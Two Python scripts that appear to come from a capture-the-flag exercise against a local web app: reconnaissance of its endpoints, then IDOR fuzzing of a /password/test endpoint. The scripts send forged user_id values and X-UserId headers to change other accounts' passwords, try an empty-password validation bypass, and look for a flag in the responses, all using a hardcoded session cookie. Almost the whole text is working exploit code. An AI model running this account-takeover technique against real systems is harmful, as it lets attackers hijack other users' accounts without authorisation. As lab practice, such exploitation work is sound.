import requests
import re

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("RECONNAISSANCE - Examining Form Structure and Endpoints")
print("=" * 80)

# Get the password change form to see required fields
print("\n[1] Fetching /password/test form...")
resp = session.get(f"{BASE_URL}/password/test", timeout=10)
print(f"Status: {resp.status_code}")
print(f"Response length: {len(resp.text)} bytes")
print("\n--- FORM CONTENT ---")
print(resp.text)

# Look for form fields
form_fields = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*>', resp.text, re.I)
print(f"\n--- FORM FIELDS DETECTED: {form_fields} ---")

# Check dashboard with full debug
print("\n" + "=" * 80)
print("[2] Dashboard endpoint analysis")
print("=" * 80)
dash_resp = session.get(f"{BASE_URL}/dashboard", timeout=10)
print(f"Status: {dash_resp.status_code}")
print(f"Headers: {dict(dash_resp.headers)}")
print(f"\n--- DASHBOARD CONTENT (first 2000 chars) ---")
print(dash_resp.text[:2000])

# Look for any user info patterns
user_info = re.findall(r'(user|id|name|email)["\']?\s*[:=]\s*["\']?([^"\'<\s]+)', dash_resp.text, re.I)
print(f"\n--- USER INFO PATTERNS: {user_info[:10]} ---")

# Check for any hidden fields or javascript containing IDs
print("\n" + "=" * 80)
print("[3] Searching for hidden user data in dashboard")
print("=" * 80)
hidden_inputs = re.findall(r'<input[^>]+type=["\']hidden["\'][^>]*>', resp.text, re.I)
print(f"Hidden inputs in password form: {hidden_inputs}")

# Search entire response for numeric patterns that could be user IDs
numeric_patterns = re.findall(r'\b(1003\d|100[0-2]\d|9999\d|10000)\b', dash_resp.text)
print(f"Numeric ID patterns found: {set(numeric_patterns)}")

# Look for any API endpoints or data endpoints
print("\n" + "=" * 80)
print("[4] Testing other potential endpoints")
print("=" * 80)

endpoints_to_test = [
    "/api/user",
    "/api/users",
    "/api/profile", 
    "/api/account",
    "/user",
    "/profile",
    "/account",
]

for endpoint in endpoints_to_test:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
        if r.status_code != 404:
            print(f"{endpoint}: Status {r.status_code}, Length {len(r.text)}")
    except Exception as e:
        pass

print("\n[RECONNAISSANCE COMPLETE]")

import requests
import re
from urllib.parse import urlencode

BASE_URL = "http://127.0.0.1:33029"
SESSION_COOKIE = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"

session = requests.Session()
session.cookies.set("session", SESSION_COOKIE)

print("=" * 80)
print("IDOR FUZZING - Proper Request Format")
print("=" * 80)

# Test IDs
test_ids = [10030, 10031, 10033, 10034, 10035, 10027, 10028, 10029, 10036, 10037]

print("\n[TEST 1] POST /password/test with all form fields + modified user_id")
print("-" * 80)

for test_id in test_ids:
    # Match the JavaScript fetch call exactly
    form_data = {
        'username': 'test',
        'password': 'testpassword123',  # Try changing password for this user
        'user_id': str(test_id)
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    try:
        resp = session.post(
            f"{BASE_URL}/password/test",
            data=urlencode(form_data),
            headers=headers,
            timeout=10,
            allow_redirects=True
        )
        
        # Check response
        has_flag = "FLAG{" in resp.text
        different_user = "John Doe" not in resp.text and len(resp.text) > 100
        
        if has_flag:
            print(f"\n[!] FLAG FOUND with user_id={test_id}!")
            print(f"Status: {resp.status_code}")
            print(f"Response:\n{resp.text}")
        elif different_user or resp.status_code != 200:
            print(f"\n[ANOMALY] user_id={test_id}")
            print(f"Status: {resp.status_code} | Length: {len(resp.text)}")
            if len(resp.text) < 1000:
                print(f"Response:\n{resp.text}")
        else:
            print(f"[OK] user_id={test_id}: Status {resp.status_code} (same user)")
            
    except Exception as e:
        print(f"[ERROR] user_id={test_id}: {e}")

print("\n" + "=" * 80)
print("[TEST 2] POST with modified X-UserId header")
print("-" * 80)

for test_id in test_ids:
    form_data = {
        'username': 'test',
        'password': 'testpassword123',
        'user_id': '10032'  # Keep form user_id as current
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-UserId': str(test_id),  # Modify header instead
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    try:
        resp = session.post(
            f"{BASE_URL}/password/test",
            data=urlencode(form_data),
            headers=headers,
            timeout=10,
            allow_redirects=True
        )
        
        if "FLAG{" in resp.text:
            print(f"\n[!] FLAG FOUND with X-UserId={test_id}!")
            print(f"Status: {resp.status_code}")
            print(f"Response:\n{resp.text}")
        elif resp.status_code != 200 or len(resp.text) < 100:
            print(f"\n[X-UserId={test_id}] Status: {resp.status_code}, Length: {len(resp.text)}")
            print(f"Response: {resp.text[:500]}")
        else:
            print(f"[X-UserId={test_id}]: Status {resp.status_code}")
            
    except Exception as e:
        print(f"[ERROR] X-UserId={test_id}: {e}")

print("\n" + "=" * 80)
print("[TEST 3] Test with empty password (validation bypass)")
print("-" * 80)

for test_id in test_ids[:3]:  # Test fewer for this one
    form_data = {
        'username': 'test',
        'password': '',  # Empty password
        'user_id': str(test_id)
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-UserId': str(test_id),
    }
    
    try:
        resp = session.post(
            f"{BASE_URL}/password/test",
            data=urlencode(form_data),
            headers=headers,
            timeout=10
        )
        
        if "FLAG{" in resp.text or resp.status_code != 200:
            print(f"\n[EMPTY PWD user_id={test_id}] Status: {resp.status_code}")
            print(f"Response: {resp.text[:500]}")
        else:
            print(f"[EMPTY PWD user_id={test_id}]: Status {resp.status_code}")
            
    except Exception as e:
        print(f"[ERROR] {e}")

print("\n" + "=" * 80)
print("[TEST 4] Try other username/path combinations")
print("-" * 80)

# Test if we can access password forms for other users
other_users = ['admin', 'user1', 'test1', 'john', 'flag']

for user in other_users:
    try:
        resp = session.get(f"{BASE_URL}/password/{user}", timeout=10)
        if resp.status_code == 200 and "John" not in resp.text:
            print(f"\n[!] /password/{user} returned different content!")
            print(f"Length: {len(resp.text)}")
            user_match = re.search(r'value=["\'](\d+)["\'][^>]*hidden', resp.text)
            if user_match:
                print(f"Found user_id: {user_match.group(1)}")
        else:
            print(f"/password/{user}: Status {resp.status_code}")
    except Exception as e:
        print(f"[ERROR] {user}: {e}")

print("\n[IDOR FUZZING ROUND 2 COMPLETE]")

